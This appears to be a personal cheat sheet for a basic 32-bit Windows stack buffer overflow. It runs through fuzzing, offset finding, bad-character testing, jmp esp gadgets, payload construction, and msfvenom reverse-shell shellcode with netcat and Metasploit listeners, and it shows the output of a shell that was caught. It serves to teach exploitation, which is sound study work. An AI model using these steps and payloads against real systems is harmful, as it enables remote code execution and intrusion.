# 32bit Shellcode Based Buffer Overflow
These are my notes for a basic 32bit buffer overflow with shellcode. It is based on windows but a lot is transferrable to linux too. I am aware that this guide is by no means perfect, it is just my take on what a basic buffer overflow encompasses. I have linked some good writeups below that helped me on my way when learning this simple attack.

[Nightmare](https://guyinatuxedo.github.io/index.html) is a great github repository, it is essentially a zero to hero guide in reverse engineering and binary exploitation.
[DoStackBufferOverFlowGood](https://github.com/justinsteven/dostackbufferoverflowgood) is what inspried me to make this cheat sheet. Goes into much greater detail about the attack and how it works.

This cheat sheet assumes that the binary doesn't have ASLR or NX enabled, meaning you can simply ret to a `jmp esp` instruction and execute shellcode from there.

To keep it simple, the steps of this attack are as follows:

1. [Fuzzing](#fuzzing)
	- [Generating cyclic patterns](#generating-cyclic-patterns)
	- [Finding the offset](#finding-the-offset)
2. [Finding bad characters](#bad-characters) (commonly 0x00, 0x0A and 0X0D)
	- [Generating all characters](#generating-all-characters)
	- [Looking at memory](#looking-at-memory)
3. [Locating jmp esp](#locating-jmp-esp)
4. [Creating payload](#creating-payload)
5. [Getting reverse shell](#getting-reverse-shell)

## Fuzzing

My preferred way of fuzzing, although unlikely to be the most efficient, is by using msf to generate a cyclic pattern of 2048 bytes and sending it to each possible user input. If a seg fault gets raised, then great! You've found your vulnerable input, if you have checked every input and still no seg fault? Increase the length of the cyclic pattern and try again.

Note: *If the binary seems to be hanging, remember that many functions that take an input from stdin will keep on reading until they hit either a null byte or a new line (\x00 or \x0a) so try appending this to the end of your payload*

Once you have found the vulnerable input, you can use a debugger to check which chunk of the pattern has overwrote the EIP. You can then search your cyclic pattern to find the size of the offset (a.k.a padding) that will be required in your exploit.

### Generating Cyclic Patterns

**Using metasploit**
```bash
msf-pattern_create -l 1024
```

**Using pwntools**  
The first method here is preferred as you can also search the pattern very easily

```python
import pwn
pattern = pwn.cyclic_gen()
pattern.get(1024)
```
OR
```python
import pwn
pwn.cyclic(1024)
```

**Using vanilla python**
```python
def gen_pattern(length=64):     # Generates a cyclic pattern of default length 64 characters
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    pattern = "aaaa"
    while len(pattern) < length:
        lchars = pattern[len(pattern) - 4:][0] + pattern[len(pattern) - 4:][1] + pattern[len(pattern) - 4:][2] + pattern[len(pattern) - 4:][3]
        if lchars[0] == "9":
            print("Maximum pattern length reached!")
            break
        elif lchars[1] == "9":
            pattern += chars[chars.find(lchars[0]) + 1] + "a99"
            continue
        elif lchars[2] == "9":
            pattern += "a" + chars[chars.find(lchars[1]) + 1] + "a9"
            continue
        elif lchars[3] == "9":
            pattern += "aa" + chars[chars.find(lchars[2]) + 1] + "a"
            continue
        else:
            pattern += lchars[0] + lchars[1] + lchars[2] + chars[chars.find(lchars[3]) + 1]
    return pattern[:length]
```

### Finding the Offset
Ensure that you're using the correct pattern when you're checking the offset. For example, if you're using msf to check the offset, ensure you used an msf pattern as your input to the binary.

If using metasploit or pwntools you can enter either the raw hex value stored in EIP or the ASCII equivalent e.g. 0x616d6261 or "amba"

**Using metasploit**
```bash
msf-pattern_offset -q ValueInEIP
```

**Using pwntools**
```py
import pwn
pattern = pwn.cyclic_gen()
pattern.find(ValueInEIP)
```

**Using vanilla python**
I would double check the offset with either pwntools or msf too, those seem to be a lot more reliable.
```py
# pattern is a string containing the cyclic pattern you sent to the binary,
# unique must be in ASCII format.
unique = input("Enter the value stored in EIP: ")

if unique in pattern:
	offset = len(pattern.split(unique)[0])
	print("Your offset is {}, meaning your EIP value is located at character {} and onwards.".format(offset + 1, offset + 2))
else:
	print("EIP value not found in cyclic pattern...")
```

**Using mona with Immunity Debugger**  
Once you've got a segfault using your pattern, you can use the following command:
```bash
!mona findmsp
```
This command will search memory for cyclic patterns and read you the value in eip, esp and ebp. It will return values in each of those registers as well as giving the offset from the beginning of the cyclic pattern, which you can then use to determine the offset of your eip overwrite in your payload later on. I highly recommend tinkering with this and using either metasploit or pwntools to double check.

## Bad Characters
One of the most crucial steps when working on buffer overflows is checking for bad characters.  
Bad characters are characters that the binary will treat differently to others, and can either change the functionality or even completely truncate your payload, rendering it useless.
The most common are 0x00, 0x0a and 0x0d (null byte, newline and carriage return). This is because many buffer overflows rely on input from stdin and most c functions that take input from stdin use either 0x00 or 0x0a to detect the end of an input.
However each binary will have it's own for you to discover.

The easiest way to check for bad characters is sending every character to the application and using a debugger such as Immunity Debugger to check for changes to the sent payload in memory. The first step of course is to generate

### Generating all characters
This python snippet will allow you to easily generate all characters from 0x00 to 0xFF excluding any characters you insert into the badchars list.
```py
# Generate pattern for badchar detection.
badchar_test = ""
badchars = [0x00]	# Definite bad chars

for i in range(0x00, 0xFF + 1):	# range(0x00, 0xFF) only returns up to 0xFE
	if i not in badchars:
		badchar_test += chr(i)
```

### Looking at memory
When looking at memory, you're really looking for the data stored inside of the stack, this data should read from 0x00 to 0xFF (obviously excluding your bad characters). If you find that your input doesn't look quite right in memory, try removing the character that seems to be causing the issue. This could be truncating your input, or even just being replaced with another byte. Either way, remove it!

There are many debuggers you can use to look through memory, personally for windows I use Immunity Debugger but anything else works too.

You can automate this process a bit through use of this mona command inside of Immunity Debugger to compare the bytes inside of a specified file to the data in memory that is located at the address stored in esp. Also, if you're using mona, you can use this code snippet alone with the one above to write your bytes to a file.

```py
with open("badchars.bin", "wb") as f:
    f.write(badchar_test)
```
Then inside Immunity Debugger run the following, changing the file path to where your .bin file is stored
```bash
!mona compare -a esp -f "c:\badchars.bin"
```
When the window pops up, status unmodified means that there are no more bad characters for you to remove.
### Locating jmp esp
The reason to locate a jump esp is because of the way we are structuring our payload; our shellcode will be stored in the stack at the location specified by the value stored in esp. So by overwriting eip to an address of a jmp esp gadget, we will be jumping directly to the address stored in esp and start executing our shellcode.

To locate the jmp esp gadget, you can use a variety of methods. The simplest is by disassembling and/or debugging the binary and searching for yourself. In addition to this certain tools have functionalities which enable the user to search for gadgets automatically.  
**Using mona with Immunity Debugger**
```bash
!mona jmp -r esp -cpb "\x00\x0A"
```
**Using ROPgadget**
```bash
ROPgadget --binary ./BINARYNAME
```

## Creating Payload
The payload we will be using will be similar to the following...
```py
buf_totlen = 4096
offset_eip = 146
jmp_esp = struct.pack("<I", jmp_ADDRESS)

buf = b""
buf += b"A"*(offset_eip - len(buf)) # padding
buf += jmp_esp                      # EIP overwrite, jmp esp
buf += sub_esp_10                   # Should be pointed to by ESP
buf += shellcode_shell
buf += b"D"*(buf_totlen - len(buf)) # Trailing padding
buf += b"\n"
```
The first two lines in the above snippet set the total length of my payload, and the offset of my shellcode respectively. I choose to do it this way because not only does it keep it easy to edit, but it also ensures that it keeps program behaviour as consistent as possible. the first addition to the buffer is simply my padding, this is just an amount of A's corresponding to my given offset.  

The third addition to buf is the address of one of the jmp esp gadgets located inside of the binary. This will be executed once the program hits a RET instruction. This is especially important because the value inside of esp is where the shellcode will be located on the stack.

The next two additions (sub_esp_10 and shellcode_shell) are both shellcode. The purpose of sub_esp_10 is to perform the assembly instructions `sub esp, 0x10`. This subtracts 16 from the value stored in ESP, moving it that many bytes away from the shellcode. This is done instead of using a NOP sled, which uses many many more bytes inside of the payload and is also a lot more buggy. The reason this is done is because the shellcode to spawn the shell is encoded due to having to avoid bad characters. That means a decoder stub must be prepended to the shellcode itself. The issue here is that the stub can blow a massive hole in the memory stored around the esp, which is of course an issue due to our shellcode being stored there which is why the esp is being moved 16 bytes away. shellcode_shell just contains the shellcode generated through msfvenom using the command below with a windows/shell_reverse_tcp payload.

The trailing padding of "D"'s and the "\n" byte is to both ensure that my input to the binary is of a specific length, and to ensure that the string is read from input properly. Simple stuff...

**Generate the** `sub esp,10` **instruction**
```bash
msf-metasm_shell

type "exit" or "quit" to quit
use ";" or "\n" for newline
type "file <file>" to parse a GAS assembler source file
metasm > sub esp,0x10
"\x83\xec\x10"
metasm > quit
```

**pop calc**
```bash
msfvenom -p windows/exec -b '\x00\x0A\x0D' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
```

**reverse shell**
```bash
msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A\x0D' -f python --var-name shellcode_shell LHOST="IPHERE" LPORT=4444 EXITFUNC=thread
```

## Getting Reverse Shell

Once you have your exploit code written it is simple enough to get a remote shell back to you. I would highly recommend just trying to pop calc before hand, this is because catching a reverse shell is another level of things to go wrong with the exploit and it's much better to troubleshoot whether your shellcode is working or not by using a simple shellcode command beforehand to make sure it's being executed correctly in the first place...

You can simply use netcat to listen for a reverse shell connection, or you can use metasploits multi handler, snippets for both are below. Once you have the listener set up using either method, simply run your exploit script and you *should* have a shell!

**Using netcat**
```bash
nc -lvnp 4444
```
If all goes right, you should recieve a shell looking something like this:
```
nc -nlvp 6666
Listening on 0.0.0.0 6666
Connection received on 127.0.0.1 52789
Microsoft Windows [Version 10.0.17763.1457]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
msedgewin10\ieuser
```

**Using metasploit**
```
msfconsole
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST IPHERE
set LPORT 4444
run
```

-------------------

That's all, hope you found it useful :)
